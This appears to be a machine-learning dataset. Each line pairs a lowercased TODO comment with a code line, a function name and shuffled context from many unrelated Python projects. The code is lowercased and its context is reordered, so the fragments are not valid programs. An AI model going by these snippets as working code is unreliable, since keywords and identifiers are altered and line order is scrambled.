# todo: remove unescape_entities when mako html safe comes in </s> 'name': sanitize.unescape_entities(node.title) if can_view else u'private component',	NodeProjectCollector to_expand = False return { 'kind': FOLDER, 'category': node.category,
#todo: fix auditor+south </s> else:	login except: usr = None form = authentication_form(request) request.session.set_test_cookie()
# todo: extract to _tmp and then move in a single command so we </s> patoolib.extract_archive(path, outdir=epath)	extract_file epath = opj(self._path, edir) if not exists(epath): path = opj(epath, file_) assert(exists(path))
"""todo doc me""" </s> def look(table):	look
# todo verify </s> req_url = "http://www.google.com/trends/hottrends/atom/feed"	hottrendsdetail def hottrendsdetail(self, payload): req = self.ses.get(req_url, params=payload) try:
# todo: add a 'comment' to the calculation </s> _set_state_noraise(calc, calc_states.parsingfailed)	retrieve_and_parse extra=newextradict ) return False return True
'''todo: add docs''' </s> def __init__(self, df):	AppModel class AppModel(object): self.df = df self.data = ColumnDataSource(df)
# todo: check arp reply is valid </s> self.asserttrue(self.packet_outs_from_flows(arp_replies))	test_add_del_route 'arp_source_ip': '10.0.0.1', 'arp_target_ip': '10.0.0.254'}) vlan = self.valve.dp.vlans[0x100] ip_dst = ipaddress.IPv4Network('10.100.100.0/24')
# todo: here we should check for the leverage based on the config value </s> self.sell_orders[base_asset].append(np.array([order.qty, order.price]))	on_order_submission else:
# todo created_at? </s> title=r['title'],	parse_file for r in raw: yield Subscription( url=r['site_url'], id=r['id'],
# todo curves </s> continue	specializeCommands continue if op[3:] == 'curveto': return commands
conv2d(in_channels=256, out_channels=6 * num_classes, kernel_size=3, padding=1), # todo: change to kernel_size=1, padding=0? </s> ])	create_fpn_mobilenetv1_ssd Conv2d(in_channels=256, out_channels=6 * num_classes, kernel_size=3, padding=1), Conv2d(in_channels=256, out_channels=6 * num_classes, kernel_size=3, padding=1), return FPNSSD(num_classes, base_net, source_layer_indexes, extras, classification_headers, regression_headers)
time.sleep(5)  # todo: for some reason, events do not trigger instantly </s> notifications = list(test_folder.get_events(subscription_id, watermark))	test_pull_notifications watermark = status_event.watermark i1 = self.get_test_item(folder=test_folder).save() self.assertEqual(len(notifications), 1) notification = notifications[0]
# todo ... </s> self.error("preprocessor: if-evaluation not yet implemented; cannot check '" + condstr + "'")	cpreprocess_evaluate_cond def cpreprocess_evaluate_cond(state, condstr): return True # may be more often what we want :P
#todo: kvick we should rename 'short_circuit' to something like 'disable_service_start' </s> if config.get('short_circuit', false):	_configure_chroot log.critical('Installation of provisioning config failed') return False if not self._disable_service_startup(): log.critical('Failure short-circuiting files')
# todo: the stuff </s> log.debug('flushing simple persistence updates to db.')	flush def flush(self):
return  #todo disabled for now, see #2151 for details </s> savecommand( savegamemanager.create_multiplayer_quicksave_name() ).execute(self)	quicksave def quicksave(self): self.ingame_gui.show_popup(_("Not possible"), _("Save/load for multiplayer games is not possible yet"))
# todo: push stream to experiment exchange </s> last_emit_time = time.time()	push logger.info('Pushing image\n', extra=dict(progress=layers, phase='pushing'))
# todo: remove force_masquerade parameter in future release </s> def add_port_fwd(zone, src, dest, proto='tcp', dstaddr='', permanent=true, force_masquerade=none):	add_port_fwd Add port forwarding. .. versionadded:: 2015.8.0
# todo(b/148082271): remove this line once tft 0.22 is used. </s> transformed_features.pop(_transformed_name(_label_key), none)	serve_tf_examples_fn parsed_features = tf.io.parse_example(serialized_tf_examples, feature_spec) transformed_features = model.tft_layer(parsed_features) return model(transformed_features)
# todo other source types </s> if source_type == sourcetype.card:	_get_or_create_source @classmethod def _get_or_create_source(cls, data, source_type): Card._get_or_create_from_stripe_object(data) return cls.objects.get_or_create(id=data["id"], defaults={"type": source_type})
# todo: add dirty file </s> return result	create cache_path = self._to_cache_path(path) result = os.open(cache_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, mode)
# todo: i can't manage the import issue, can you? </s> new_args, new_kwargs, new_type = sy.frameworks.torch.hook_args.hook_function_args(	handle_func_command except AttributeError: pass cmd, args, kwargs )
raise notimplementederror  # todo </s> def __init__(self, perturbation_function, steps, recompute_analysis=false):	__init__
dot_product_threshold = 0.95 # todo(ntonci): add to parameters </s> i = 0	prefilter_using_screw_axis dq_B_H_vec = copy.deepcopy(dq_B_H_vec_in) n_quaternions = len(dq_W_E_vec) while i < len(dq_W_E_vec): dq_W_E_i = dq_W_E_vec[i]
# todo: make a tests that asserts that an observer can receive updates from the hyperparamsjsonrepository </s> repo: hyperparamsjsonrepository = hyperparamsjsonrepository()	test_hyperparams_json_repository_should_be_observable_in_memory def test_hyperparams_json_repository_should_be_observable_in_memory(): pass
# todo special case for b=c? </s> if b==c: continue	sample_G b = edges[i][1] c = edges[j][1] a = np.random.randint(0, n) k = Ka(D, m, b, c, a)
# todo: proper distinction between text and bytes. </s> c = super(request, self).replace(pattern, repl, flags)	replace Returns: The number of replacements made. self.path, pc = utils.safe_subn( pattern, repl, self.path, flags=flags
# todo: this can unnecessarily suspend the starting of a build, in </s> log.msg("starting build %s.. pinging the slave %s"	_startBuildFor self.maybeStartBuildsForBuilder(self.name) return % (build, slavebuilder)) wfd = defer.waitForDeferred(
# todo (rtibbles): sort out the status of quizzes, and either reinstate them or remove them. </s> }	user_progress_detail "path": leaf_node["path"],
# todo: remove the check for deprecated check_docs after the extension has been removed </s> if (	test_enable_all_extensions plugins = [] for filename in os.listdir(os.path.dirname(extensions.__file__)): filename.endswith(".py") and not filename.startswith("_")
# todo: support auto-alignment, need a context object for this, eg: </s> self.stream.write("{:>{align}}:{:<5} {:9} {}\n".format(	CodePrinter def __call__(self, event, basename=os.path.basename): filename = event.filename or "<???>" basename(filename), event.lineno,
# reasons why we said no. todo: allow configurable error messages </s> raise synapseerror(	create_association ) if not self.config.is_alias_creation_allowed(user_id, room_alias.to_string()): 403, "Not allowed to create alias", )
# todo?: self.assert_eq(kdf.loc['a':'o', 'b':'d'], pdf.loc['a':'o', 'b':'d']) </s> self.assert_eq(kdf.loc[kdf.b > 0, 'b'], pdf.loc[pdf.b > 0, 'b'])	test_loc2d_duplicated_columns self.assert_eq(kdf.loc['j':'q', 'B'], pdf.loc['j':'q', 'B']) self.assert_eq(kdf.loc['j':'q', ['B']], pdf.loc['j':'q', ['B']])
# todo : test with/without leave_one_out </s> corpus = {'a.txt': 'lorem sit amet', 'b.txt': 'lorem ipsum'}	test_train_supervised_model def test_train_supervised_model(tmp_path): tmp_corpus = create_corpus(corpus, tmp_path) tmp_ref = tmp_path / 'ref.json'
# todo: implement </s> raise notimplementederror	remove_audio raise RuntimeError("No audio RTP stream is active within this SIP session")
''' todo: test failing as of 2015/06/03 and needs to be completed. ''' </s> cert = 'gobbledy'	test_cert_bad_cert def test_cert_bad_cert(self): context = AuthenticationContext(cp['authorityTenant']) def callback(err):
headers = csv_reader[0] # todo check size </s> csv_reader = csv_reader[1:]	fetch_result if TASK_SERVER.RESULT_CACHE.get(): csv_reader = caches[CACHES_CELERY_QUERY_RESULT_KEY].get(_result_key(notebook)) # TODO check if expired else: csv_reader = csv.reader(f, delimiter=','.encode('utf-8'))
# todo remove in v8 </s> def patch_notice_level(logger: logging.logger):	patch_notice_level logger.notice = logger.warning return logger
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_pass_message_long def test_pass_message_long(self): The message is too long to fit into a single transaction.
#todo: maybe it could be better as a background task </s> query = cls.query(cls.expiration_date <= datetime.datetime.now())	_delete_expired @classmethod def _delete_expired(cls): expired = query.fetch(keys_only=True) ndb.delete_multi(expired)
# todo: replace with below line when numba supports np.isin in nopython mode </s> return pandas.series([(x in values) for x in self._data])	hpat_pandas_series_isin_impl def hpat_pandas_series_isin_impl(self, values):
# todo: use correct priority instead of 0 </s> self.wconfd.client().updatelockswaiting(self._wconfdcontext, 0, request)	_AcquireLocks request) elif timeout is None: while True: pending = self.wconfd.Client().HasPendingRequest(self._wconfdcontext)
# todo: remove this skip after fixing </s> if sys.version[0] == 3:	test_circle_draw @requires_application() def test_circle_draw(): raise SkipTest with TestingCanvas() as c:
# todo add locales </s> raise yunohosterror("domain_name_unknown", domain=domain)	domain_set_settings domains = _load_domain_settings() if not domain in domains.keys(): setting_set = False if ttl is not None:
# todo in the future it's possible we'll want to break this out by action_type, in order to track </s> if period:	split_periods period = None elif base_action_type == 'consumption': period.add(tx)
@deprecated_alias(net='prev_layer', end_support_version=1.9)  # todo remove this line for the 1.9 release </s> def __init__(self, prev_layer, scale=2, n_out_channel=none, act=tf.identity, name='subpixel_conv2d'):	SubpixelConv2d ------------ - `Real-Time Single Image and Video Super-Resolution Using an Efficient Sub-Pixel Convolutional Neural Network <https://arxiv.org/pdf/1609.05158.pdf>`__ _err_log = "SubpixelConv2d: The number of input channels == (scale x scale) x The number of output channels" super(SubpixelConv2d, self).__init__(prev_layer=prev_layer, name=name)
# todo: make pull request to get this custom vgg feature accepted </s> with slim.arg_scope(vgg.vgg_arg_scope()):	FCN_32s number_of_classes) upsample_filter_tensor = tf.constant(upsample_filter_np) logits, end_points = vgg.vgg_16(processed_images, num_classes=2,
# todo: check the status before chaging the port </s> _xml = """<ribcl version="2.0">	configure_https_port .. code-block:: bash salt '*' ilo.configure_https_port 4334 <LOGIN USER_LOGIN="adminname" PASSWORD="password"> <RIB_INFO MODE="write">
# todo(emfree): remove after status overhaul. </s> if account.sync_state != 'running':	create_account account.smtp_endpoint = (response['smtp_server_host'], response['smtp_server_port']) account.sync_state = None return account
# todo: site-wide announcements. </s> return jingo.render(request, 'dashboards/review.html')	review @login_required def review(request):
# todo use blenddata </s> bl_collection = getattr(bpy.data, name)	load for name, _ in context.properties(bpy_type=T.BlendData): if name in collection_name_to_type: for _id_name, item in bl_collection.items(): ensure_uuid(item)
1  # todo: fill in identifier </s> )	test_update_mediated_transfer direct_transfer1 = channel1.create_directtransfer( transfer_amount, direct_transfer1.sign(privatekey1, address1) direct_transfer1_data = str(direct_transfer1.packed().data)
# todo: implement link-local handling in networkmanager backend and move this test into commontests() </s> self.assert_iface_up(self.dev_e_client, [], ['inet6 2600:'])	test_eth_dhcp6_off_no_accept_ra self.generate_and_settle()
# todo check. </s> oprnd0 = tb.read(instruction.operands[0])	_translate_movq oprnd1 = tb.read(instruction.operands[1]) tmp0 = tb.temporal(oprnd0.size)
# todo: need token </s> e_die('undefined variable %r', node.name)	ArithEvaluator if val.tag == value_e.Undef: if self.exec_opts.nounset: else: return 0
# todo: add at least reflection tests before adding notimplemented version </s> def mixrampdb(context, decibels):	mixrampdb *musicpd.org, playback section:* ``mixrampdb {deciBels}``
# todo: need to account for feature engineering here - probably need to have hardcoded test data rather than calculating splits here </s> return train_sentinels, validation_sentinels, holdout_sentinels	expected_sentinels ) holdout_sentinels.append((input_df, target_df))
# todo: this decompose is used because of cache </s> circuits.append(circuit.decompose())	construct_evaluation_circuit circuit = wave_function.copy(name=circuit_name_prefix + pauli.to_label()) circuit.append(inst, qr) else: base_circuit = wave_function.copy()
except exception:  # todo - which exceptions? </s> pass	clean_up try: os.remove(filename)
preprocessed_state_space=spaces.floatbox(shape=(2,)),  # todo: remove once auto preprocessor space inference done. </s> action_space=env.action_space	test_apex_weight_syncing "configs/apex_agent_for_random_env.json", state_space=env.state_space, ) policy_weights = agent.get_policy_weights()
# todo: cleanup </s> self.asserttrue(self.remote.copy_repo(repo, "testrepocopy", self.token))	test_copy_repo repo = self.remote.get_item_handle("repo", "testrepo0", self.token)
# todo use base64 data </s> if handle not in self._ap_memif_handles:	_request__read_block8 def _request__read_block8(self, handle, addr, word_count): raise exceptions.Error("invalid handle received from remote memory access") return self._ap_memif_handles[handle].read_memory_block8(addr, word_count)
# todo: total_reward isn't always greater than 95 even with a working implementation </s> environment = gym.make('spaceinvaders-v0')	main def main(): agent = Agent( environment.observation_space,
# todo: maybe change this later to push some more info, not just the </s> message = socket.inet_aton(self.config.get("global", "clientip"))	do_hello def do_hello(self): self.send(common.CONTROL_CHANNEL_BYTE, common.CONTROL_INIT+message, (self.server_tuple, self.ICMP_identifier, self.ICMP_sequence, 0))
# todo: add support for heteroskedasticsingletaskgp </s> if isinstance(batch_mo_model, heteroskedasticsingletaskgp):	batched_multi_output_to_single_output >>> batch_mo_gp = SingleTaskGP(train_X, train_Y) >>> batch_so_gp = batched_multioutput_to_single_output(batch_gp) raise NotImplementedError( "Conversion of HeteroskedasticSingleTaskGP currently not supported."
# todo add options to maodify the sorted by key and the header options </s> matrix = sorted(matrix, key=lambda endpoint: endpoint[2])	do_show endpoint.p_next_state]) if len(matrix) > 0: matrix.insert(0, ['Name', 'State', 'MAC Address', 'Segment', 'Port', 'VLAN', 'IPv4', 'IPv6', 'Next State'])
# todo: handle this </s> 0, 0, 0, 0, positioning_x + position_x, positioning_y + position_y)	draw_background_image context.transform(
1  # todo: fill in identifier </s> )	_transfer amount, target, async_result.wait() finished.set()
# todo: keep # pylint: disable=fixme </s> self.standard_button_min_width_px = 75	__init__ self.small_button_min_width_str = "60px" self.tiny_button_min_width_str = "50px" border_modern = "border-style:solid; border-radius:4;border-color:grey; border-width:0;" # modernize self.pushbuttonstyles_simulator = {
# todo: preallocate! </s> i, j, v = np.empty(0), np.empty(0), np.empty(0)	faceDiv if getattr(self, '_faceDiv', None) is None: self.number() for cell in self.sortedCells: i, j, v = cell.faceIndex
# todo: user info </s> djangorequestextractor(request).extract_into_event(event)	processor with _internal_exceptions():
# todo: use weight scaling factor if provided, xavier's default else </s> self.weights = sharedx(	_initialize_weights if irange is None: irange = self.irange .5 - rng.rand(nvis, self.nhid) * self.irange, name='W',
#todo: consider if this should check if the store belongs to a </s> return self.name.startswith('pootle-terminology')	_get_is_terminology def _get_is_terminology(self):
start_time_synced_s = none  # todo </s> duration_s = none  # todo	_recording_update_legacy_from_v1_15_to_pprf_2_0 recording_uuid = None #TODO start_time_system_s = None  # TODO recording_software_name = None  # TODO recording_software_version = None  # TODO
# todo improve precision </s> warnings.warn("the cohen-gismalla schemes are only given in single-precision.")	cohen_gismalla_2 def cohen_gismalla_2(): r = 0.5878606 s = 0.9353943
# todo: rewrite tests </s> pass	test_resend_confirmation_post_regenerates_token @mock.patch('framework.auth.views.mails.send_mail') def test_resend_confirmation_post_regenerates_token(self, send_mail, random_string):
# todo: expose from marshal </s> def _w_long(x):	_w_long XXX Temporary until marshal's long functions are exposed. x = int(x)
pass #todo: update pupil invisible recording to pupil capture v1.15 format </s> def _recording_update_pupil_invisible_to_v1_15(rec_dir: str):	_recording_update_pupil_invisible_to_v1_15
# todo action required that updates the endpoint </s> return self.sdnc.remove_ignored_endpoints()	remove_ignored def remove_ignored(self, args):
# todo: why the reversal? </s> for r in range(0,sides):	__init__ self.norms, 0, 1, 0, self.texcoords, ya * 0.5 + 0.5, xa * 0.5 + 0.5) addTri(self.inds, 0, r + 1, r + 2) self.vertices = c_floats(self.verts);
# todo index.json only if htmlsections in doc key.. </s> return fn.endswith("index.html") or fn.endswith("index.json")	is_index_page def is_index_page(self): fn = self.output().name
# todo: start here </s> pass	_igs_for_role_satisfy_fleet def _igs_for_role_satisfy_fleet(actual_igs, req_fleet):
#todo: refractor asap </s> try:	generate_script ) json_data['runtime'] = runtime template = Template(job.template) except Exception as exc:
#todo enable again when farm is upgraded incl. the new offset calc </s> assert results["answers"][0]["probability"] <= 1	test_output assert results["answers"][0]["answer"] == "Carla" assert results["answers"][0]["offset_start"] == 11 assert results["answers"][0]["probability"] >= 0 assert results["answers"][0]["context"] == "My name is Carla and I live in Berlin"
# todo: better exception handling </s> logging.warning("reference not found in %s" % jam_path)	read_references ref_inters, ref_labels = ann.data.to_interval_values() except: return [] ref_times = utils.intervals_to_times(ref_inters)
# todo(lyarwood): test drivervolumeblockdevice.detach in </s> self._test_detach_volume(destroy_bdm=false)	test_detach_volume_not_destroy_bdm def test_detach_volume_not_destroy_bdm(self):
# update new uniqueid kodi 17 - todo get uniqueid_id for updates from embydb </s> if self.kodi_version > 16:	add_update ratingid =  self.kodi_db.create_entry_rating() self.kodi_db.add_ratings(ratingid, showid, "tvshow", "default", rating, votecount) uniqueid =  self.kodi_db.create_entry_uniqueid() self.kodi_db.add_uniqueid(uniqueid, showid, "tvshow", tvdb, "tvdb")
# todo_recorders - need to pass in parent info instead of none </s> metadata = create_local_meta(none, self.pathname)	record_iteration Record an iteration of the current System. self.iter_count += 1 update_local_meta(metadata, (self.iter_count,)) self._rec_mgr.record_iteration(self, metadata, method=inspect.stack()[1][3])
# todo: test for first revision on last page. </s> offset = url_for(controller='revision', action='list')	test_list_format_atom revisions = model.repo.history().all() revision1 = revisions[0] res = self.app.get(offset + '?format=atom') print res
# todo add the ability to `git reset --hard` the dataset tree on failure </s> raise exc	_execute_command cmd_exitcode = e.code if expected_exit is not None and expected_exit != cmd_exitcode: lgr.info("== Command exit (modification check follows) =====") return cmd_exitcode, exc
# todo(jflesch): i18n / l10n </s> score = 0	__compute_ocr_score The score is the number of words only made of 4 or more letters ([a-zA-Z]) prog = re.compile(r'^[a-zA-Z]{4,}$') for word in txt.split(" "):
breaks = {}   # todo: support more than one breakpoint per line </s> for line in output:	invoke from_tty=False, to_string=True).splitlines() pattern = re.compile("([^:]+):(\d+)") fields = re.split("\s+", line) if fields[3] == 'y':    # Is enabled?
# todo: verify that workid is the primary key someplace. </s> yield workitem.dowork()	work workItem = yield workItemClass.load(txn, workID) yield workItem.delete()
# todo: test me. </s> @motion.setter	motion def motion(self, name): self.settings.vi['motion'] = MOTION_TRANSLATION_TABLE.get((self.action, name), name)
# todo: process the remaining tag types. </s> if captures['tag'] is '!':	_parse pos = match.end() buffer.append(captures['whitespace']) pass buffer.append(template[pos:])
# todo add inv parameter? </s> params1d = [iap.handle_continuous_param(	LogContrast def __init__(self, gain=1, per_channel=False, name=None, deterministic=False, random_state=None): gain, "gain", value_range=(0, None), tuple_to_uniform=True, list_to_choice=True)]
# todo: should allow multi_dimensional inputs/outputs </s> layer_sizes=(*scale_hidden_sizes, inputs.shape.as_list()[-1]),	scale_wrapper return feedforward_net( inputs, regularizer=tf.contrib.layers.l2_regularizer( self.scale_regularization))
# todo: change to nih:sha-256; hashes </s> a["uri"] = 'urn:hash::sha1:' + f	_ro_aggregates a = {} (folder,f) = posixpath.split(path) a["bundledAs"] = { "uri": self.base_uri + path,
# todo(py3.7): add required=true </s> p_operation = parser.add_subparsers(dest="operation", metavar="operation")	add_interact_arguments @classmethod def add_interact_arguments(cls, parser): p_tty = p_operation.add_parser( "tty", help="connect UART to stdin/stdout")
# todo partially update stored playlists? </s> len(tracks), position, playlist.name())	tracks_added u'%d track(s) added to position %d in playlist "%s"',
# xxx todo alignement check </s> return [m2_expr.expraff(a, b)], []	movapd def movapd(ir, instr, a, b):
raise  # todo: what if our seed node fails verification? </s> return potential_seed_node	learn_from_seednode potential_seed_node.verify_node(self, accept_federated_only=accept_federated_only) except potential_seed_node.InvalidNode:
# todo this thing is too wide </s> row.operator("luxcore.material_copy", text=str(obj.active_material.users))	LUXCORE_PT_context_material row.prop(obj.active_material, "name", text="") if obj.active_material.users > 1: row.prop(obj.active_material, "use_fake_user", text="") row.operator("luxcore.material_copy", text="", icon=icons.DUPLICATE)
# todo: prepopulate </s> forms1 = [f for f in gen_unprocessed_growth_monitoring_forms()]	test_get_unprocessed_and_mark def test_get_unprocessed_and_mark(self): test_get_unprocessed_growth_monitoring_forms should not return marked forms mark_as_processed([forms1[0]]) forms2 = [f for f in gen_unprocessed_growth_monitoring_forms()]
# todo(mriedem): remove this conversion when all neutronv2 apis are </s> self.instance = fake_instance.fake_instance_obj(self.context,	_deallocate_for_instance def _deallocate_for_instance(self, number, requested_networks=None): **self.instance) api = neutronapi.API()
# todo: expect_match should work with emit() </s> m = state.expect_match(	scan_command_exit state.expect('+') state.ignore() r'(?:f(?:ile)?f(?:ormat)?|(?:file)?enc(?:oding)?|(?:no)?bin(?:ary)?|bad|edit)(?=\s|$)', lambda: VimError(ERR_INVALID_ARGUMENT))
# todo(mordred) when this changes to rest, force interface=admin </s> if self.cloud_config.get_api_version('identity') != '3':	update_user user = self.get_user(name_or_id) kwargs['user'] = self.get_user_by_id(user['id'], normalize=False) kwargs.pop('domain_id', None) kwargs.pop('description', None)
# todo: there is probably a robuster way than a sleep. </s> time.sleep(0.5)	launch ) except requests.ConnectionError: else: break
# todo check </s> return self.mimetype	format @interfacedoc def format(self):
# todo: create xxx_failure test </s> p = op.join(app.config['root'], 'tests/fixtures/ttf/font-bold.ttf')	test_result_METADATA_postScriptName_canonical_success def test_result_METADATA_postScriptName_canonical_success(self): r = run_set(p, 'result') success_tests = r['success']
# todo action required that updates the endpoint </s> eps = []	ignore def ignore(self, args): device = args.rsplit(' ', 1)[0] if device == 'inactive':
1  # todo: fill in identifier </s> )	test_automatic_dispute direct_transfer = channel0.create_directtransfer( amount_alice2, direct_transfer.sign(privatekey0, address0) channel0.register_transfer(direct_transfer)
# todo: verify the key is rsa </s> blocklen = ceil_shift(self.size(),3)	verify The signature that needs to be validated. :Return: True if verification is correct. False otherwise. try: em = EMSA_PKCS1_V1_5_ENCODE(m, blockLen)
#create and insert todo on remote site </s> todo = dict(doctype='todo', description=description, assigned_by='administrator')	insert_into_producer def insert_into_producer(producer, description): return producer.insert(todo)
# todo(akshakya): validate shapes of params. </s> if len(parameters) != len(self.params):	__call__ a list of optimal variable values, one for each CVXPY Variable supplied to the constructor. raise ValueError('A tensor must be provided for each CVXPY ' 'parameter; received %d tensors, expected %d' % (
# todo: move log_pi and correction under self.log_pi_for() </s> (self.distribution.log_p_t	log_diagnostics self.distribution.log_sigs_t, self.distribution.log_ws_t, - self._squash_correction(self.distribution.x_t)), ),
# todo: remove when old stats are removed </s> old_stats = store0.get_stats()	test_data_tool_store_get_stats def test_data_tool_store_get_stats(store0): stats = store0.data_tool.get_stats() assert ( sorted(old_stats.keys())
# todo(py3.7): add required=true </s> p_operation = parser.add_subparsers(dest="operation", metavar="operation")	add_interact_arguments @classmethod def add_interact_arguments(cls, parser): p_measure = p_operation.add_parser( "measure", help="read measured values")
# todo: handle agg_columns. </s> self.assert_eq(	test_filter pdf.groupby("b").filter(lambda x: any(x.a == 2)).sort_index(), ) kdf.groupby(["a", "b"]).filter(lambda x: any(x.a == 2)).sort_index(), pdf.groupby(["a", "b"]).filter(lambda x: any(x.a == 2)).sort_index(),
# todo? don't consider the empty set here </s> for cause_subset in utils.powerset(possible_causes):	contexts possible_causes = np.where(np.sum(network.connectivity_matrix, 1) > 0)[0] possible_effects = np.where(np.sum(network.connectivity_matrix, 0) > 0)[0] for effect_subset in utils.powerset(possible_effects): if cause_subset and effect_subset:
# todo: remove this when fixed in: https://github.com/seleniumhq/selenium/issues/767 </s> cls.browser.service.process.send_signal(signal.sigterm)	tearDownClass def tearDownClass(cls): cls.browser.close() cls.browser.quit() cls.percy.finalize_build()
# todo: implement </s> pass	test_migration_skew def test_migration_skew(self):
# todo proper error messages </s> result = {}	check_options def check_options(self, options): if options["System`Trace"].to_python(): result["TraceFn"] = print
# @todo: this has a chance to spam the user with notifications </s> return	push_to_websocket def push_to_websocket(msg): if not clients: main_io_loop = app.instance.web_server.io_loop for client in clients:
# todo: this is not the best place to configure rank? why is rank not </s> train_image.set_shape((none, none, 3))	train train_dataset = dataset() train_image = train_dataset['image'] train_bboxes = train_dataset['bboxes'] train_image = tf.expand_dims(train_image, 0)
# todo: add lon lats ! </s> satscene.orbit = mda[orbit_idx + 111:orbit_idx + 116]	load250 orbit_idx = mda.index("ORBITNUMBER")
self.assertequals(status, 200) # todo: 202 when asynchronous </s> status, body = self.post(path, body)	test_update options=options,)
# todo: pandas returns dataframe, maybe return namedtuple instread of </s> func_text = "def f({}):\n".format(', '.join(col_name_args))	_handle_df_describe col_names = self.df_vars[func_mod.name].keys() col_name_args = ["c"+str(i) for i in range(len(col_names))] for c in col_name_args: func_text += "  {}_count = hpat.hiframes_api.count({})\n".format(c, c)
# todo(harlowja): the bug 1214083 is causing problems </s> log.debug(_("%(flow)s has moved %(runner)s into state %(state)s with"	task_log_change def task_log_change(state, details): " result: %(result)s") % {'state': state, 'flow': str(details['flow']),
# todo: pytorch v0.4 has torch.where function </s> nrm_trn_idx = torch.from_numpy(np.where(trn_lbl.numpy() != abn_cls_idx)[0])	get_mnist_anomaly_dataset Returns: [np.array] -- New training-test images and labels. abn_trn_idx = torch.from_numpy(np.where(trn_lbl.numpy() == abn_cls_idx)[0]) nrm_tst_idx = torch.from_numpy(np.where(tst_lbl.numpy() != abn_cls_idx)[0])
# todo change when v4 web3.py will released </s> dht_keys = tuple(self.escrow().getminerid(self.address, index).encode('latin-1') for index in range(count))	get_dht_key def get_dht_key(self) -> tuple: count = self.escrow().getMinerIdsCount(self.address) return dht_keys
# todo: handle values and aggfunc options </s> def _impl(index, columns, values=none, rownames=none, colnames=none,	_impl aggfunc=None, margins=False, margins_name='All', dropna=True, normalize=False, _pivot_values=None):
self._cloud_flow_complete_message.addaction("", i18n_catalog.i18nc("@action", "review your connection"), "", "", 1) # todo: icon </s> self._start_cloud_flow_message.actiontriggered.connect(self._onreviewcloudconnection)	_onCloudPrintingConfigured i18n_catalog.i18nc("@info:status", "Connected!") # image caption ) self._cloud_flow_complete_message.show() active_machine = self._application.getMachineManager().activeMachine
# todo(sirp): snet=false for now, however, if the instance of </s> connection_class = get_connection_class(conn_class)	delete (user, key, authurl, container, obj) = \ cls._parse_swift_tokens(parsed_uri) swift_conn = conn_class( authurl=authurl, user=user, key=key, snet=False)
# todo: expose from marshal </s> def _w_long(x):	_w_long XXX Temporary until marshal's long functions are exposed. x = int(x)
engine = sel.bind  # todo: get engine from select </s> with engine.connect() as conn:	select_to_base @convert.register(base, sa.sql.Select, cost=300.0) def select_to_base(sel, dshape=None, **kwargs): result = conn.execute(sel) assert not dshape or isscalar(dshape)
# act as if we were to install the packages in todownload </s> for po in todownload:	downloadPackages self.doTsSetup() self.localPackages = [] self.tsInfo.addInstall(po) self.localPackages.append(po)
#todo, multipart raw submissions need further parsing capacity. </s> instance = request.raw_post_data	post instance = request.FILES['xml_submission_file'].read() else: try: doc = post_xform_to_couch(instance)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_min_weight_magnitude_float def test_fail_min_weight_magnitude_float(self): ``min_weight_magnitude`` is a float.
# todo - this isn't actually the correct way to set the vary header, </s> response.headers['allow'] = ', '.join(self.allowed_methods)	dispatch except ErrorResponse, exc: response = exc.response response.headers['Vary'] = 'Authenticate, Accept' return self.emit(response)
# todo: fix this to show all configs </s> stage_configurations = self.stage.stage_configurations().all()	DeploymentCreate def get_context_data(self, **kwargs): context = super(DeploymentCreate, self).get_context_data(**kwargs) context['configs'] = stage_configurations.exclude(prompt_me_for_input=True) context['stage'] = self.stage
# todo bucket-owner-read and bucket-owner-full-control </s> mode = next((ca['acl'] for ca in canned_acls if ca['grants'] == non_owner_grants), 'custom')	scan_object grants = acl.grants non_owner_grants = [grant for grant in grants if not (grant['Grantee'].get('ID') == owner['ID'] and grant['Permission'] == 'FULL_CONTROL')] if mode == 'private': puts(obj.key + ' ' + colored.green(mode))
# todo...or leave it to user's default? </s> })	create msg_data = urllib.urlencode({ 'message': obj.get('content', '').encode('utf-8'), if type == 'comment': _, post_id = util.parse_tag_uri(obj['inReplyTo'][0]['id'])
assert 'not both' in res.stdout  # todo: stderr </s> res = cc.fail_1(['glom', '--target-file', basic_target_path, basic_spec, basic_target])	test_usage_errors res = cc.fail_1(['glom', '--spec-file', basic_spec_path, BASIC_SPEC, BASIC_TARGET]) assert 'spec' in res.stdout assert 'target' in res.stdout assert 'not both' in res.stdout  # TODO: stderr
# todo: check that stack trace is maintained. </s> m2 = m0.excluding('local_useless_reshape')	Test_local_useless_reshape topo = f1.maker.fgraph.toposort() assert not any(isinstance(n.op, tensor.basic.Reshape) for n in topo) m2 = m1.excluding('ShapeOpt') f2 = theano.function([x], r, mode=m2)
# todo: distributed search messages need to implemented </s> self.logmessage("%s %s" %(msg.__class__, vars(msg)), 4)	DistribBranchRoot def DistribBranchRoot(self, msg):
# todo extend to nonbinary nodes </s> conditioned_tpm = (mechanism_node.tpm if	cause_repertoire for mechanism_node in mechanism: inputs = self._get_inputs(mechanism_node) self.current_state[mechanism_node.index] == 1 else 1 - mechanism_node.tpm)
# todo(mriedem): consider skipping the microversion discovery </s> return cinderclient(context, '3.27').attachments.update(	attachment_update representing the updated volume attachment. try: attachment_id, connector) except cinder_exception.ClientException as ex:
# fixme todo we should verify we get a circuit_new event for </s> timeout = 10	test_build_circuit_timedout path.append(FakeRouter("$%040d" % x)) path[0].flags = ['guard'] clock = task.Clock() d = build_timeout_circuit(self.state, clock, path, timeout, using_guards=True)
# todo: wobble </s> gast = sidereal_time(self.jd, use_eqeq=true)	altaz ' observe from a specific Earth location that' ' you specify using a Topos instance') spin = spin_x(-gast * TAU / 24.0) uz = einsum('i...,ij...->j...', uze, spin)
# todo: vectorize with numpy </s> for value in np.nditer(updated_values):	validate_quant_values if max_error <= 1e-4: if check_values is True: if not dtype.allowed(value): raise Exception(
# todo: avoid magic string value </s> if r.storage_form() == "entity-nesting":	__directory_relations_by_arg_num rels = [] for r in get_relation_type_list(directory): continue if len(r.arg_list) != 2:
raise tornado.gen.return(notebook)  # todo py2: replace by return </s> else:	load_notebook notebook = model['content'] notebook = yield self.fix_notebook(notebook) raise tornado.web.HTTPError(500, 'file not supported')
# todo: hack </s> network_authentication_id = container_stacks[0].getmetadataentry("network_authentication_id")	read stack = container_stacks[0] if self._resolve_strategies["machine"] == "override": network_authentication_key = container_stacks[0].getMetaDataEntry("network_authentication_key") container_stacks[0].deserialize(archive.open(container_stack_file).read().decode("utf-8"))
# todo(ytknzw): add more specific assertion with the test case. </s> figure = plot_slice(study, params=["param_a"])	test_plot_slice figure = plot_slice(study) assert figure.has_data() is True assert figure.has_data() is True with pytest.raises(ValueError):
